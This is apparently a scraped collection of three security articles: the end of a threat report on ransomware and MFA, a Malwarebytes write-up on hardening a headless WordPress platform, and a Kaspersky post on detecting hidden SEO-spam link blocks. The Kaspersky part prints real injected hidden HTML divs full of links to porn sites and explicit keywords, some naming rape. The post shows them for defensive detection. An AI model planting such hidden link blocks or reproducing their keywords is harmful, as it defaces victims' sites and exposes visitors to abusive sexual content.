ransomware.\nUnauthorized access of this nature allows threat actors to bypass traditional security measures and gain direct entry into internal systems, even if the appliance is fully patched against known vulnerabilities. Other types of commonly abused access include remote desktop logins or administrative accounts. In other words, methods designed to protect authorized access for remote employees can also give attackers access if the protection is not sufficiently strong.\nThreat actors often purchase the credentials on underground marketplaces. Infostealer malware steals credentials and other data from systems that it infects. The stolen data is then packaged into logs and sold online to other threat actors. Millions of logs are available for sale, and the number continues to rise sharply each year. As a result, protecting systems from infostealer infections forms a key part of defending against subsequent ransomware or data extortion attacks.\nThreat actors who obtain partial credentials may also try to brute-force access on VPN accounts. If they succeed in gaining access, it is almost always because the VPN does not require MFA to authenticate. MFA alone does not prevent all unauthorized access, but it does reduce the threat of the most opportunistic cybercrime. Implementing phishing-resistant MFA on all internet-facing services and appliances reduces risk levels even further. This type of MFA uses hardware-backed methods to prevent token theft.\nWhat You Should Do Next\nReview\nguidance\npublished by U.S. Cybersecurity and Infrastructure Security Agency (CISA) on\nimplementing phishing-resistant MFA.\nLegacy vulnerabilities maintain their value\nEven if a vulnerability is years old, it’s rarely too late to patch.\nIn August, the Federal Bureau of Investigation (FBI)\nwarned\nthat Russian state-sponsored threat actors linked to the Russian Federal Security Service’s (FSB) Center 16 were conducting cyberespionage attacks against U.S. and other entities by actively targeting Cisco devices unpatched against a vulnerability from 2018. CTU researchers observed similar activity by Russian state-sponsored threat actors in 2023.\nThe FBI was also one of multiple agencies in the U.S. and beyond to issue a\nwarning\nabout Chinese state-sponsored threat actors compromising networks worldwide for espionage purposes. The part of the document that covered how the attackers gained initial access states that “they are having considerable success exploiting publicly known common vulnerabilities” rather than previously unknown zero-day vulnerabilities. The document lists the Cisco vulnerability from 2018, as well as others from 2023 and 2024 that affect edge devices.\nOrganizations may not patch promptly for many reasons. Budgetary restrictions and limited personnel are just two factors that can impact a patching program. Staff may lack awareness of the vulnerability or not realize that impacted equipment is in use. Some patches may require additional evaluation or need to be replaced with workarounds to avoid potential impact to other business-critical operations. In some cases, equipment is so old that vendors no longer publish security updates. Nonetheless, unpatched edge devices put organizations at risk. During incident response engagements that CTU researchers observed in 2024, vulnerabilities in internet-facing devices were the most common initial access vectors.\nThe risk posed by unpatched devices is not going to decline. It is already easy to use freely available scanning systems and publicly available exploit code to find and exploit vulnerable systems, and it is feasible that AI might automate this further. Prompt patching according to business risk calculations or replacement of end-of-life systems remain more important than ever.\nWhat You Should Do Next\nMonitor government and vendor advisories and other threat intelligence sources about threat actor\nbehavior, and follow patching advice as appropriate in your environment.\nConclusion\nDespite changes in threat group composition and increases in attack numbers, some aspects of the cyber threat remain the same. Cybercriminals and state-sponsored threat actors continue to take advantage of easy access to organizations’ environments. Fortunately, the basics of good cyber defense also remain constant: prompt patching, phishing-resistant MFA, and comprehensive monitoring and response.\nShare this:\nClick to share on Mastodon (Opens in new window)\nMastodon\nClick to share on Bluesky (Opens in new window)\nBluesky\nClick to share on Reddit (Opens in new window)\nReddit\nClick to share on LinkedIn (Opens in new window)\nLinkedIn\nMore\nClick to share on Tumblr (Opens in new window)\nTumblr\nClick to share on Pocket (Opens in new window)\nPocket\nClick to print (Opens in new window)\nPrint\nClick to email a link to a friend (Opens in new window)\nEmail\nShare on Facebook\nShare on X\nShare on LinkedIn",

      "published_date": "2025-10-17",
      "content": "It might surprise some that a security company would choose WordPress as the backbone of its digital content operations. After all, WordPress is often associated with open-source plugins, community themes, and a wide range of deployment practices—some stronger than others. But that perception overlooks what modern WordPress can deliver when it’s architected, operated, and governed with discipline. In our Digital Experience Platform (DXP) at Malwarebytes, WordPress serves as the content layer—an editorial hub that feeds multiple customer experiences.The reason is pragmatic and security-forward. WordPress offers transparency (open code and ecosystem), control (self-hosted in our environment, with strict governance), and maturity (a seasoned core with an established security model). Combined with a decoupled architecture, strong identity and access controls, rigorous supply chain management, and a hardened infrastructure, WordPress becomes an ideal content engine for an enterprise-grade, security-first DXP within an enterprise-grade MarTech stack.DXP vision and the role of WordPressWhen we say DXP, we mean the orchestration layer that brings together content, personalization, analytics, experimentation, commerce, support experiences, and more. It’s not a single product; it’s the way we coordinate systems to deliver cohesive customer journeys across web, mobile, and product surfaces.In that model, WordPress is our content authoring hub. Editors draft, review, and publish content once; APIs then power multiple front-ends—websites built with Next.js/React, mobile applications, and support portals. This headless pattern decouples the authoring experience from delivery.Why decouple?By delivering both static and server-side rendered (SSR) pages directly from the edge, we meet aggressive latency goals and excel inCore Web Vitalsscores on a global scale. This approach ensures content is as close as possible to end users, providing consistently fast load times regardless of location. Our architecture isolates site performance from backend processes, meaning bursts of traffic or complex deployments don’t degrade the visitor experience.Security isolation is equally foundational to our platform design. The public-facing runtime never exposes the WordPress admin interface or control endpoints—instead, these administrative components reside securely behind private networking, protected by robust access controls andauthentication. This segmentation shields both business-critical operations and sensitive data, lowering the attack surface and reducing risk without impeding editors or developers.This architecture also boosts development velocity. Front-end engineers can iterate rapidly, independently releasing new features or improvements without being bottlenecked by backend deployments. At the same time, content editors retain full publishing agility via the headless CMS, able to launch and update site content at will. This parallel, decoupled workflow ensures that technical and editorial teams each operate at their highest efficiency, supporting an environment of continuous innovation and timely content delivery.How speed helps securityRapid and reliable deployments are a cornerstone of our security posture, empowering us to respond quickly to new threats and vulnerabilities. By streamlining and automating our release processes, we can efficiently ship patches and mitigations as soon as issues arise, minimizing the window of exposure. Equally important, our deployment pipelines are built to support safe rollbacks, allowing us to confidently revert any changes that introduce instability or unexpected behavior—maintaining operational continuity no matter how urgent the circumstances.Shortening our development and deployment cycle is not just about speed—it’s one of the most effective security controls we employ. Frequent, predictable deploys mean our systems are always running the latest protections and bug fixes, dramatically reducing the risks associated with outdated code or configurations. This agility ensures we stay ahead of evolving threats, support innovation without sacrificing safety, and adapt to changing requirements with minimal disruption, making security a continuous, integrated aspect of our delivery workflow.Why WordPress aligns with security-firstOpen-source transparency matters. With WordPress, we can inspect every line of core and plugin code, run our own audits, and make informed decisions about the attack surface. The community’s response to security issues adds resilience through coordinated disclosures, rapid patches, and widely disseminated advisories.The core platform is mature and stable. The WordPress security team has established processes for responsible disclosure and a consistent patch cadence. Operating close to core (and avoiding heavy core modifications) enables us to adopt updates quickly.Finally, talent availability accelerates secure outcomes. A large pool of WordPress developers and security practitioners means faster remediation, effective code reviews, and a healthy ecosystem of best practices and tooling.Architecture that reduces risksHeadless/decoupled architectureOur public website leverages the powerful combination of a Content Delivery Network (CDN) and a Web ApplicationFirewall(WAF) to deliver a seamless and secure user experience. By distributing static content across global edge locations, the CDN ensures lightning-fast load times while also enabling server-side rendering at the edge for dynamic content. This hybrid approach allows us to serve both static and server-rendered pages efficiently, providing relevant content with minimal latency. Positioned behind the CDN, the WAF offers an added layer of security by blocking malicious traffic and safeguarding our site from threats, ensuring that both performance and protection are at the forefront of our web infrastructure.To further enhance security and streamline workflows, we utilize single sign-on (SSO) with multi-factor authentication (MFA) for accessing all administrative interfaces and developer endpoints. The WordPress admin area, GraphQL and REST APIs, as well as build hooks, are only accessible through this robust SSO with MFA, ensuring that only authorized team members can reach sensitive controls and data. Access is strictly segmented, treating the admin plane as an internal-only application and fully separating it from the public-facing site. This architecture minimizes risk, protects critical infrastructure, and supports efficient, secure collaboration among our administrative and development teams.Network and edge securityOur Web Application Firewall (WAF) works in tandem with advancedbotmanagement to protect our site from a wide range of online threats. The WAF actively filters malicious payloads and prevents exploitation attempts, while the bot management system blocks known bad actors and suspicious automated traffic. Together, they help enforce rate limits—ensuring fair usage and preventing abuse that could impact site performance or security. This layered approach allows us to maintain a reliable, secure environment for all our users while shielding our resources from sophisticated cyber threats.To further secure our infrastructure, we have robustDDoSmitigation controls in place, designed to identify and absorb large-scale volumetric attacks before they reach our application. Coupled with customizable geo-blocking and ASN (Autonomous System Number) policies, we can restrict or filter access from high-risk regions and networks known for hostile activity. This proactive combination not only helps protect against both widespread and targeted attacks, but also ensures the continued availability and performance of our services for legitimate users around the globe.We enforce modern transport security standards across our entire platform by mandating TLS 1.3 for all connections. This ensures data transmitted between users and our site is encrypted using the latest, most secure protocol available. In addition, HTTP Strict Transport Security (HSTS) is enabled, compelling browsers to interact with our site only via secureHTTPSconnections. Together, TLS 1.3 and HSTS provide strong guarantees of data integrity, confidentiality, and protection against common interception or downgrade attacks, giving our users peace of mind with every interaction.Service isolation and least privilegeOur security framework is built on the principle of least-privilege access, ensuring that databases, object storage, and service accounts are tightly controlled. Each system and user is granted only the permissions essential for their specific role—nothing more. This minimizes the potential impact of accidental or malicious activity, as access is segmented and strictly limited across all layers of our architecture. By aligning permissions closely with functional requirements, we significantly reduce the risk of data exposure or unauthorized operations, reinforcing the integrity and confidentiality of our platform.Hardening at the application layerSecure configurationIn our production WordPress environment, we implement a series of stringent measures to protect both the core application and user data. File editing through the wp-admin interface is completely disabled, eliminating a common attack vector and reducing the risk of unauthorized code changes. We enforce the use of strong, unique salts and keys, enhancing the integrity and security of authenticationcookiesand stored data. Additionally, the core filesystem is kept strictly read-only in production, preventing alterations to critical files and ensuring that even in the event of a compromise, attackers cannot modify system-level code or inject persistent threats.To further reduce the platform’s attack surface, we restrict XML-RPC functionality—often abused for brute-force attacks—and limit exposed REST API endpoints strictly to those required by our headless WordPress clients. User enumeration patterns, which attackers mayexploitto gather account names, are actively blocked, thereby safeguarding user identities. On the front end, we enforce robust security headers, including a finely scoped Content Security Policy (CSP) to mitigate XSS threats, strict X-Frame-Options and Frame-Ancestors to prevent clickjacking, X-Content-Type-Options to block MIME-type attacks, and a privacy-friendly Referrer-Policy to minimize information leakage. Together, these layered controls ensure our site remains resilient against a broad spectrum of web threats.Auth and session securityWe integrate Single Sign-On (SSO) through industry-standard protocols such as SAML and OIDC, streamlining secure access for our teams while reducing the risks associated with password proliferation. Automated user provisioning and deprovisioning are managed via SCIM, ensuring that access is immediately granted to new team members and promptly revoked when it’s no longer needed. MFA is mandatory for all privileged users, significantly strengthening the security of critical accounts and administrative functions, and defending against credential-based attacks.Access within our environment is granted based on granular, role- and capability-based policies. Custom roles are carefully tailored so that editors, contributors, and admins receive only the permissions essential to their responsibilities, minimizing exposure and preventing privilege creep. We further secure administrative access by enforcing short-lived sessions, reducing the window of opportunity forsession hijackingor misuse. This approach ensures that even if an administrative session is compromised, the potential for abuse is tightly constrained, keeping our site and its data safe.Data handlingSecurity is at the forefront of our development practices, with a strong emphasis on protecting both our site and its users from application-level threats. We enforce the use of prepared statements for all database queries to defend againstSQL injection, mandate thorough output escaping to prevent cross-site scripting (XSS), and ensure rigorous input sanitization in every layer of custom code and approved plugins. For protection against cross-site request forgery (CSRF), we implement nonces, providing an additional safeguard to validate user actions and prevent unauthorized commands. This multifaceted approach applies to every custom solution and trusted extension, reinforcing the reliability and trustworthiness of our platform.Data privacy and compliance round out our security strategy. We are committed to minimizing the storage ofpersonally identifiable information (PII), classifying data sensitivity, and applying data retention policies that align with both regulatory requirements and customer expectations. Consent management is thoughtfully integrated into both our publishing workflow and the front-end user experience, so we can uphold privacy standards without sacrificing usability. This ensures users remain informed and in control of their data—supporting compliance with privacy laws and building trust through transparency and respect for user choices.Plugin and supply chain governanceControlled ecosystemOur approach to plugin management is deliberately conservative, maintaining a strict allowlist to ensure only vetted and essential plugins are present within our environment. We prioritize the use of “must-use” (mu-) plugins for enforcing global policies and delivering critical functionality, as these plugins are always active and centrally managed. This strategy prevents unauthorized or unnecessary code from entering our system, supports consistency across environments, and enables us to embed security controls directly into our platform’s foundational layers.Before any plugin or theme is deployed to production, it undergoes a comprehensive code review process to assess security, performance, and compatibility. We are proactive in curbing plugin sprawl, regularly auditing our stack and removing redundant or unsupported components to minimize complexity and reduce our attack surface. By keeping our codebase lean and disciplined, we not only defend against potential vulnerabilities found in third-party additions but also streamline maintenance and updates, ensuring the long-term stability and security of our production environment.Dependency managementWe take a comprehensive approach to dependency management and software supply chain integrity by generating Software Bill of Materials (SBOMs) for both PHP and JavaScript codebases. SBOMs allow us to track all direct and transitive dependencies, as well as their associated licenses, ensuring greater visibility and control over the components that make up our application. Dependencies are always pinned and locked to specific, approved versions, reducing the risk of introducing vulnerabilities through unintentional upgrades or changes. Automated tools like Dependabot continuously monitor for updates and propose them, but nothing reaches production unless it successfully passes through our continuous integration (CI) security gates.Our CI/CD pipeline is fortified with robust security controls at every stage. Every update, whether a dependency or code change, triggers automated Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST) to identify potential vulnerabilities both before and during runtime. We employ secret scanning to prevent accidental exposure of credentials and keys, and every build is evaluated for license compliance and regulatory conformance. This layered approach ensures that our development processes are secure by default, continually verifying software quality, integrity, and compliance before anything is deployed to production.Vulnerability intelligence and patchingWe actively monitor CVE feeds and WordPress-focused security advisories, such as WPScan, to stay ahead of emerging vulnerabilities and threats. By keeping a close eye on both general and platform-specific intelligence sources, we’re able to rapidly identify potential risks relevant to our infrastructure. Upon detection, vulnerabilities are triaged and addressed according to well-defined Service Level Agreements (SLAs) based on severity—ensuring that critical issues receive immediate attention and routine patches are managed efficiently. This structured, proactive posture helps us mitigate risk and maintain the ongoing security and stability of our environment.In the rare event that a critical vulnerability threatens operational security or integrity, we are prepared with fast rollback plans that allow us to swiftly revert to a secure state. These procedures are designed to be executed with minimal disruption, ensuring urgent patches can be applied without causing extended downtime for users or administrators. By integrating rapid response capabilities into our workflows, we’re able to act decisively and minimize exposure, all while maintaining service availability and reliability at the highest standard.Infrastructure security operationsSecrets and dataWe enforce strict secret management practices by using a centralized vault or cloud-native secret store to handle all sensitive credentials, API keys, and configuration secrets. No secrets are ever embedded in source code or stored within deployment images, reducing the risk of accidental exposure. Secret rotation is scheduled regularly as part of our operational cadence, ensuring that credentials remain fresh and limiting the window of opportunity for misuse even if a secret were somehow compromised.All data is secured with encryption both at rest and in transit, leveraging strong cryptographic controls across storage and networking layers. Where supported, our databases rely on IAM-based authentication instead of static credentials, further minimizing the risk associated with traditional username-password pairs. This approach not only enhances security but also streamlines access control and auditability, underpinning our commitment to robust, modern data protection practices throughout the stack.Backups and disaster recoveryOur disaster recovery strategy rests on maintaining versioned, immutable backups that cannot be altered or deleted, providing a reliable safeguard against data loss, corruption, orransomwareattacks. These backups are created on a regular schedule and include not only application data, but also content, media assets, and configuration files. We conduct periodic restore drills to validate that our backups are effective and to ensure our team is prepared to execute recovery procedures smoothly. Explicit Recovery Time Objectives (RTOs) and Recovery Point Objectives (RPOs) are defined, routinely tested, and adjusted as needed to meet the demands of our operations and regulatory obligations.Data recovery playbooks are meticulously maintained and encompass every critical aspect of our environment, from core content and media to infrastructure-as-code templates that can quickly and predictably rebuild our systems. These playbooks provide step-by-step guidance for recovering data and restoring services, whether in response to accidental deletion, hardware failure, or a targeted attack. By rigorously documenting and testing these processes, we ensure a high degree of resilience and confidence in our ability to restore normal operations with minimal disruption, safeguarding both our assets and the experience of our users.Observability and responseWe maintain a comprehensive observability stack with centralized, structured logging that aggregates data from all key layers—Nginx, PHP-FPM, WordPress, and supporting services. This logging is enriched with real-time metrics and distributed traces, giving us end-to-end visibility into application performance and user activity across our digital experience platform (DXP). All logs are funneled into a Security Information and Event Management (SIEM) system, which acts as the nerve center for detecting and investigating potential threats. Hosts and containers are further protected by Endpoint Detection and Response (EDR) solutions, providing continuous monitoring and the ability to quickly isolate and remediate suspicious behavior.To enhance detection and incident response, we employ automated anomaly detection and maintain detailed runbooks, dramatically reducing our mean time to detect (MTTD) and mean time to respond (MTTR) to issues. Our security posture is continually tested and validated through regular penetration tests and an active bug bounty program that focus on the entire surface of our DXP, not just on isolated components. This holistic approach ensures we proactively identify vulnerabilities, address weaknesses before they can be exploited, and ultimately maintain a resilient, trustworthy platform for our users and customers.Certifications ObtainedWhen it comes to building or selecting hosting for your organization’s sensitive data and mission-critical applications, certifications matter—a lot. Obtaining FedRAMP Moderate certified ensures compliance with rigorous federal security standards, making it a necessity for government-related workloads and a great standard for any organization to abide. Similarly, a SOC 2 Type 1 certification demonstrates that a hosting provider has established robust systems and controls to protect data and ensure privacy, fostering client trust and accountability.GovRAMP Moderate is critical for U.S. government contractors working with state and local government workloads, ensuring additional layers of compliance and security. If your data processing touches on European clients or users, GDPR and the Data Privacy Framework offer reassurance that personal data is handled and processed lawfully, transparently, and securely. Equally important is the Microsoft SSPA, a must-have for vendors providing services to Microsoft or handling its data. Lastly, WCAG 2.0 AA compliance ensures that your hosted applications and websites are accessible to users and employees with disabilities, strengthening your commitment to inclusivity and expanding your reach. By prioritizing these certifications, organizations not only safeguard compliance and security, but also demonstrate a dedication to transparency, privacy, and accessibility in today’s digital landscape.Editorial workflow governanceWorkflow controlsEvery administrative and content-related event is thoroughly audit-logged, capturing a detailed trail of actions for review and oversight. These logs are fully exportable, supporting compliance with regulatory requirements and internal governance policies. By maintaining comprehensive and accessible audit records, we provide the transparency necessary to facilitate investigations, enforce accountability, and demonstrate adherence to best practices and legal obligations—ensuring peace of mind for our organization and stakeholders alike.Secure content operationsWe prioritize security awareness by providing editors with ongoing training on critical topics, such asphishingrecognition, safe link practices, and our governance policies for embedded scripts and third-party widgets. This continual education helps staff identify and avoidsocial engineering attacks, understand the risks associated with external content, and adhere to protocols that maintain the integrity and security of our web platform. By empowering editors with the knowledge to make secure decisions, we reduce the likelihood of errors that could compromise the site or expose sensitive information.To further protect user interactions, especially on forms, we deploy layered anti-spam defenses, implement bot challenges like CAPTCHAs, and set server-side rate limits to prevent abuse. All form inputs are validated on the server, ensuring robust protection even if client-side checks are bypassed or disabled. This disciplined approach to input handling and abuse prevention ensures our forms remain a secure channel for legitimate user engagement while blocking malicious actors and automated attacks.Reliable and secure performanceCaching strategyOur performance strategy centers on comprehensive caching and efficient data handling to deliver a fast, reliable experience for both users and administrators. Edge and page-level caching shield our origin servers by intercepting and serving frequent requests directly at the edge, dramatically reducing the number of dynamic requests that reach the core infrastructure. Object caching solutions like Redis, coupled with thoughtfully optimized queries, keep the admin interface responsive and ensure APIs remain quick even under load. We routinely profile database queries and set strict performance budgets for the slowest paths, preventing regressions that could degrade performance or escalate into broader availability issues. This layered approach ensures our platform stays speedy, stable, and scalable as demands grow.Build pipelineEvery code change in our workflow is subjected to automated testing, with comprehensive suites that verify functionality, performance, and security. Security gates are tightly integrated into the CI/CD pipeline, ensuring that no changes are merged if any issues or vulnerabilities are detected. Our deployment processes are fully automated and repeatable, significantly reducing the potential for human error and guaranteeing that releases are consistent, predictable, and recoverable.By managing our infrastructure as code, we further ensure that all environments—from development to production—are consistent, auditable, and easily reproducible. This approach not only accelerates the provisioning of resources and the rollout of updates, but also strengthens compliance and traceability, providing a solid foundation for scalability, reliability, and continuous improvement.UX and SEOWe finely tune our security headers and Content Security Policies (CSPs) to deliver robust protection without disrupting the user experience, ensuring that all site functionality remains seamless and accessible. Our commitment to performance extends to advanced image optimization, responsive asset delivery, and strict adherence to accessibility standards, enabling our content to load quickly and be usable by everyone. By consistently delivering fast, accessible pages, we not only enhance user engagement but also enable rapid, safe deployment cycles—minimizing potential attack windows through swift rollouts and efficient rollbacks, and maintaining both security and usability at the core of our platform.Alternatives consideredProprietary Digital Experience Platforms (DXPs) present a compelling all-in-one suite of features that can streamline operations for many organizations. However, their advantages often come with trade-offs: these platforms tend to be resource intensive, both in terms of infrastructure and licensing fees, and may lack the granular transparency required for deep security audits or targeted customizations. The inherent complexity and tightly-coupled nature of these solutions can slow the pace of change—making it challenging to adapt or patch emergent threats rapidly, which is itself a significant security and business risk in dynamic environments.Headless-only SaaS CMSes, on the other hand, are designed for flexibility and API excellence, offering developers modern tooling and a frictionless integration experience. Despite these strengths, organizations may encounter challenges such as vendor lock-in, which can limit strategic choices and agility over time. Control over patching and updates is usually in the hands of the SaaS provider, potentially creating gaps between issue discovery and remediation. Further, these platforms may present hurdles in regions with strict data residency or compliance requirements, making them less suitable for regulated industries or global enterprises with nuanced jurisdictional needs.Systems like Drupal or fully-custom CMS architectures can undoubtably satisfy enterprise requirements for scale, extensibility, and security. However, in our evaluation, team expertise, the maturity and momentum of the adjacent tooling ecosystem, and a clear view of total cost of ownership all ultimately favored the adoption of WordPress. WordPress’s balance of flexibility, a wealth of existing integrations, well-understood operational paradigms, and strong community support enables us to deliver on our goals efficiently while ensuring we maintain the adaptability, security, and cost-effectiveness our organization requires.WordPress provides the best mix of transparency, control, ecosystem breadth, and speed—when paired with our security architecture and operating model.Lessons learned and best practicesStart headless and isolate the admin plane from day one.Enforce SSO and MFA, least privilege roles, and formal change approval.Treat plugins as third-party code: audit, monitor, and patch under SLAs.Invest in observability and rehearse incident response regularly.Keep WordPress core close to vanilla; extend through vetted plugins and mu-plugins, not core forks.Security is not a property of a tool; it’s the outcome of architecture, governance, and culture. With a decoupled design, rigorous controls, and a disciplined operational posture, WordPress is a strong foundation for the content layer of an enterprise DXP—combining the openness and speed teams want with the security and control the business requires of its MarTech stack.",

      "content": "When analyzing the content of websites in an attempt to determine what category it belongs to, we sometimes get an utterly unexpected result. It could be the official page of a metal structures manufacturer or online flower shop, or, say, a law firm website, with completely neutral content, but our solutions would place it squarely in the “Adult content” category. On the surface, it is completely unclear how our systems arrived at that verdict, but one look at the content categorization engine’s page analysis log clears it up.Invisible HTML block, or SEO spamThe website falls into the questionable category because it contains an HTML block with links to third-party sites, invisible to regular users. These sites typically host content of a certain kind – which, in our experience, is most often pornographic or gambling materials – and in the hidden block, you will find relevant keywords along with the links. These practices are a type of Black Hat SEO, or SEO spam: the manipulation of website search rankings in violation of ethical search engine optimization (SEO) principles. Although there are many techniques that attackers use to raise or lower websites in search engine rankings, we have encountered hidden blocks more frequently lately, so this is what this post focuses on.Website owners rarely suspect a problem until they face obvious negative consequences, such as a sharp drop in traffic, warnings from search engines, or complaints from visitors. Those who use Kaspersky solutions may see their sites blocked due to being categorized as prohibited, a sign that something is wrong with them. Our engine detects both links and their descriptions that are present in a block like that.How hidden links workHyperlinks that are invisible to regular users but still can be scanned by various analytical systems, such as search engines or our web categorization engine, are known as “hidden links”. They are often used for scams, inflating website rankings (positions in search results), or pushing down the ranking of a victim website.To understand how this works, let us look at how today’s SEO functions in the first place. A series of algorithms is responsible for ranking websites in search results, such as those served by Google. The oldest and most relevant one to this article is known asPageRank. The PageRank metric, or weight in the context of this algorithm, is a numerical value that determines the importance of a specific page. The higher the number of links from other websites pointing to a page, and the greater those websites’ own weights, the higher the page’s PageRank.So, to boost their own website’s ranking in search results, the malicious actor places hidden links to it on the victim website. The higher the victim website’s PageRank, the more attractive it is to the attacker. High-traffic platforms like blogs or forums are of particular interest to them.However, PageRank is no longer the only method search engines use to measure a website’s value. Google, for example, also applies other algorithms, such as the artificial intelligence-basedRankBrainor theBERT language model. These algorithms use more sophisticated metrics, such asDomain Authority(that is, how much authority the website has on the subject the user is asking about), link quality, and context. Placing links on a website with a high PageRank can still be beneficial, but this tactic has a severely limited effect due to advanced algorithms and filters aimed at demoting sites that break the search engine’s rules. Examples of these filters are as follows:Google Penguin, which identifies and penalizes websites that use poor-quality or manipulative links, including hidden ones, to boost their own rankings. When links like these are detected, their weight can be zeroed out, and the ranking may be lowered for both sites: the victim and the spam website.Google Panda, which evaluates content quality. If the website has a high PageRank, but the content is of low quality, duplicated, auto-generated, or otherwise substandard, the site may be demoted.Google SpamBrain, which uses machine learning to analyze HTML markup, page layouts, and so forth to identify manipulative patterns. This algorithm is integrated into Google Penguin.What a Black Hat SEO block looks like in a page’s HTML markupLet us look at some real examples of hidden blocks we have seen on legitimate websites and determine the attributes by which these blocks can be identified.Example 1<div style=\"display: none;\">\nافلام سكس اعتصاب <a href=\"https://www.azcorts.com/\" rel=\"dofollow\" target=\"_self\">azcorts.com</a> قنوات جنسية\nfree indian porn com <a href=\"https://porngun.mobi\" target=\"_self\">porngun.mobi</a> xharmaster\n石原莉紅 <a href=\"https://javclips.mobi/\" target=\"_blank\" title=\"javclips.mobi\">javclips.mobi</a> ちっぱい\nbank porn <a href=\"https://pimpmpegs.net\" target=\"_self\" title=\"pimpmpegs.net free video porn\">pimpmpegs.net</a> wwwporm\nsalamat lyrics tagalog <a href=\"https://www.teleseryeone.com/\" target=\"_blank\" title=\"teleseryeone.com sandro marcos alexa miro\">teleseryeone.com</a> play desi\n</div>\n<div style=\"display: none;\">\nكسى بيوجعنى <a href=\"https://www.sexdejt.org/\" rel=\"dofollow\">sexdejt.org</a> سكس سانى\nindian sex video bp <a href=\"https://directorio-porno.com/\" rel=\"dofollow\" target=\"_self\" title=\"directorio-porno.com\">directorio-porno.com</a> xvideos indian pussy\nswara bhaskar porn <a href=\"https://greenporn.mobi\" title=\"greenporn.mobi lesbian porn hq\">greenporn.mobi</a> kannada sexy video\nbp sex full <a href=\"https://tubepornmix.info\" target=\"_blank\" title=\"tubepornmix.info aloha tube porn video\">tubepornmix.info</a> lily sex\npinayflix pamasahe <a href=\"https://www.gmateleserye.com/\" rel=\"dofollow\" target=\"_blank\">gmateleserye.com</a> family feud november 17\n</div>\n<div style=\"display: none;\">\nsunny leone ki bp download <a href=\"https://eroebony.info\" target=\"_self\" title=\"eroebony.info\">eroebony.info</a> hansika xvideos\nموقع سكس ايطالى <a href=\"https://bibshe.com/\" target=\"_self\" title=\"bibshe.com سكس العادة السرية\">bibshe.com</a> صور احلى كس\nraja rani coupon result <a href=\"https://booketube.mobi\" rel=\"dofollow\">booketube.mobi</a> exercise sex videos\nindianbadwap <a href=\"https://likeporn.mobi\" rel=\"dofollow\" target=\"_blank\" title=\"likeporn.mobi free hd porn\">likeporn.mobi</a> rabi pirzada nude video\nmarathi porn vidio <a href=\"https://rajwap.biz\" rel=\"dofollow\" target=\"_blank\" title=\"rajwap.biz\">rajwap.biz</a> www.livesex.com\n</div>This example utilizes a simple CSS style,<divstyle=\"display: none;\">. This is one of the most basic and widely known methods for concealing content; the parameterdisplay:none; stands for “do not display”. We also see that each invisible<div>section contains a set of links to low-quality pornographic websites along with their keyword-stuffed descriptions. This clearly indicates spam, as the website where we found this block has no relation whatsoever to the type of content being linked to.Another sign of Black Hat SEO in the example is the attributerel=\"dofollow\". This instructs search engines that the link carries link juice, meaning it passes weight. Spammers intentionally set this attribute to transfer authority from the victim website to the ones they are promoting. In standard practice, webmasters may, conversely, userel=\"nofollow\", which signifies that the presence of the link on the site should not influence the ranking of the website where it leads.Thus, the combination of a hidden block (display:none;) and a set of external pornographic (in this instance) links with therel=\"dofollow\"attribute unequivocally point to a SEO spam injection.Note that all<div>sections are concentrated in one spot, at the end of the page, rather than scattered throughout the page code. This block demonstrates a classic Black Hat SEO approach.Example 2<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">سكس انجليز <a href=\"https://wfporn.com/\" target=\"_self\" title=\"wfporn.com افلام سحاق مترجم\">wfporn.com</a> سكس كلاسيك مترجم</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">فيلم سكس <a href=\"https://www.keep-porn.com/\" rel=\"dofollow\" target=\"_blank\">keep-porn.com</a> سكس هندى اغتصاب</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">desi nude tumbler <a href=\"https://www.desixxxv.net\" title=\"desixxxv.net free hd porn video\">desixxxv.net</a> kanpur sexy video</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">www wap sex video com <a href=\"https://pornorado.mobi\" target=\"_self\">pornorado.mobi</a> sexy film video mp4</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">mom yes porn please <a href=\"https://www.movsmo.net/\" rel=\"dofollow\" title=\"movsmo.net\">movsmo.net</a> yes porn please brazzers</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">xxx download hd <a href=\"https://fuxee.mobi\" title=\"fuxee.mobi\">fuxee.mobi</a> fat woman sex</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">bangalore xxx <a href=\"https://bigassporntrends.com\" rel=\"dofollow\" target=\"_self\" title=\"bigassporntrends.com\">bigassporntrends.com</a> sexy video kashmir</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">xnxx sister sex <a href=\"https://wetwap.info\" rel=\"dofollow\" target=\"_self\" title=\"wetwap.info hd porn streaming\">wetwap.info</a> blue film a video</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">tamilschoolsexvideo <a href=\"https://tubetria.mobi\" rel=\"dofollow\" title=\"tubetria.mobi\">tubetria.mobi</a> sex free videos</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">سكس من اجل المال مترجم <a href=\"https://www.yesexyporn.com/\" title=\"yesexyporn.com فوائد لحس الكس\">yesexyporn.com</a> نسوان شرميط</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">kamapishi <a href=\"https://desisexy.org/\" target=\"_blank\" title=\"desisexy.org free porn gay hd online\">desisexy.org</a> savita bhabhi xvideo</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">aflamk2 <a href=\"https://www.pornvideoswatch.net/\" target=\"_self\" title=\"pornvideoswatch.net\">pornvideoswatch.net</a> نيك ثمينات</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">hentaifox futanari <a href=\"https://www.hentaitale.net/\" target=\"_blank\" title=\"hentaitale.net pisuhame\">hentaitale.net</a> hen hentai</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">video sexy wallpaper <a href=\"https://povporntrends.com\" target=\"_blank\">povporntrends.com</a> bengolibf</div>\n<div style=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">persona 5 hentai manga <a href=\"https://www.younghentai.net/\" rel=\"dofollow\" target=\"_self\" title=\"younghentai.net oni hentai\">younghentai.net</a> toys hentai</div>This example demonstrates a slightly more sophisticated approach to hiding the block containing Black Hat SEO 